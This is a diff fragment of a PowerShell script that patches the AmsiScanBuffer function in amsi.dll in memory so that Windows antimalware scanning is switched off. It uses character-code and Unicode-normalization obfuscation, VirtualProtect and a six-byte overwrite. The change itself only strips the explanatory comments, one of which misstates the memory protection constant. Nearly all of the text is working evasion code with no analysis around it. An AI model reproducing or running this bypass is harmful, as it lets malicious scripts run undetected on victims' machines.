@@ -13,11 +13,11 @@ public class _class {
 }
 "@ # Define and create a class to load the kernel32 DLL. 
 
-Add-Type $_class # Load the class
-$kkkk = 0 # Define the variable to store the old protection
+Add-Type $_class
+$kkkk = 0
 $jjjj = [_class]::LoadLibrary("$(('àmsì'+'.dll').nORMaLiZe([chAR]([bYTE]0x46)+[chAr]([BYTE]0x6f)+[chAR]([bYte]0x72)+[chAR]([Byte]0x6d)+[cHar](68*38/38)) -replace [chAr]([byTE]0x5c)+[char](112*87/87)+[ChaR](94+29)+[CHAR](64+13)+[CHAr]([bytE]0x6e)+[CHAR](58+67))")# Replaces FormD characters with FormC characters
 $iiii = [_class]::GetProcAddress($jjjj, "$([char](6+59)+[char]([byte]0x6d)+[char](115*58/58)+[char](105+63-63)+[char](83)+[char](96+3)+[char](97)+[char](100+10)+[char](66*20/20)+[char](117)+[char](102*29/29)+[char]([byte]0x66)+[char]([byte]0x65)+[char](114+76-76))") # Get the address of the function with ProcAddress
-[_class]::VirtualProtect($iiii, [uint32]5, 0x40, [ref]$kkkk) # Change the protection of the address to 0x40. This is the same as PAGE_EXECUTE_READ. 
+[_class]::VirtualProtect($iiii, [uint32]5, 0x40, [ref]$kkkk) 
 
 $aaaa = "0x"
 
@@ -38,7 +38,7 @@ $bbbb = $bbbb + "3"
 
 
 $hhhh = [byte[]] ($cccc,$gggg,$ffff,$eeee,+$dddd,+$bbbb) 
-[System.Runtime.InteropServices.Marshal]::Copy($hhhh, 0, $iiii, 6)  # Copy the bytes to the address
+[System.Runtime.InteropServices.Marshal]::Copy($hhhh, 0, $iiii, 6)
 
 # --------------------------------------------------------------------------------------------------------------------
 
